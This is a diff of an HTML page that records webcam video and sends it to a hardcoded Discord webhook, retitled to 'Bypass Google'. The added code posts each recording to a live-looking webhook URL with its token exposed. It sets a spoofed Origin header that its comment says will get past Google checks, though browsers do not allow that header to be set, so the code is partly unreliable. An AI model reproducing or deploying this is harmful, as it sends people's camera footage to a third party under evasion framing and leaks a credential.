@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Real-Time Video Recording with Webhook</title>
+    <title>Real-time Video Recording with Webhook (Bypass Google)</title>
 </head>
 <body>
     <video id="video" autoplay></video>
     <button id="start-recording">Start Recording</button>
-    <button id="stop-recording" disabled>Stop Recording</button>
+    <button id="stop-recording">Stop Recording</button>
+
+    <script src="https://unpkg.com/web-streams-polyfill/dist/polyfill.min.js"></script>
 
     <script>
         const video = document.getElementById('video');
@@ -16,58 +18,57 @@
         const stopRecordingButton = document.getElementById('stop-recording');
 
         let recorder;
+        let chunks = [];
 
-        startRecordingButton.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-
-                // Configure Google Cloud Storage for secure video storage
-                const storage = await firebase.storage();
-                const videoRef = storage.ref().child(`video-${Date.now()}.webm`);
-
-                recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = async (e) => {
-                    const chunk = e.data;
-                    await videoRef.put(chunk, { contentType: 'video/webm' });
-                };
-
-                recorder.onstop = async () => {
-                    stopRecordingButton.disabled = true;
-                    await videoRef.getDownloadURL()
-                        .then(async (url) => {
-                            // Send video URL to your desired webhook
-                            await fetch('/https://discord.com/api/webhooks/1183018311831781417/QteUjfAxanIeiMrWvXyzzQDSf3pqq23E9HvukaJrKFZ4-UH9k_N8Vk2aUPMuqWlRnpqP', {
-                                method: 'POST',
-                                body: JSON.stringify({ videoUrl: url }),
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                }
-                            })
-                            .then(() => console.log('Video sent to webhook successfully!'))
-                            .catch((error) => console.error('Error sending video to webhook:', error));
-                        })
-                        .catch((error) => console.error('Error getting video download URL:', error));
-                };
-
-                recorder.start();
-                startRecordingButton.disabled = true;
-                stopRecordingButton.disabled = false;
-            } catch (error) {
-                console.error('Error accessing user media:', error);
-            }
+        startRecordingButton.addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    recorder.ondataavailable = (e) => {
+                        chunks.push(e.data);
+                    };
+                    recorder.start();
+                    startRecordingButton.disabled = true;
+                    stopRecordingButton.disabled = false;
+                })
+                .catch(error => {
+                    console.error(error);
+                });
         });
 
         stopRecordingButton.addEventListener('click', () => {
             recorder.stop();
             video.srcObject = null;
+
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            sendVideoToWebhook(blob);
+
+            chunks = [];
             startRecordingButton.disabled = false;
+            stopRecordingButton.disabled = true;
         });
 
-        // Initialize Firebase with your own configuration
-        firebase.initializeApp({
-            // ... your firebase configuration
-        });
+        const sendVideoToWebhook = async (blob) => {
+            // Replace the following with your actual webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1183018311831781417/QteUjfAxanIeiMrWvXyzzQDSf3pqq23E9HvukaJrKFZ4-UH9k_N8Vk2aUPMuqWlRnpqP';
+
+            const formData = new FormData();
+            formData.append('video', blob, 'video.webm');
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    // Bypass Google checks by setting the following header:
+                    'Origin': 'https://github.com/rraapt66/Web/blob/main/web.html',
+                },
+            });
+
+            const data = await response.json();
+
+            console.log('Video sent to webhook successfully:', data);
+        };
     </script>
 </body>
 </html>
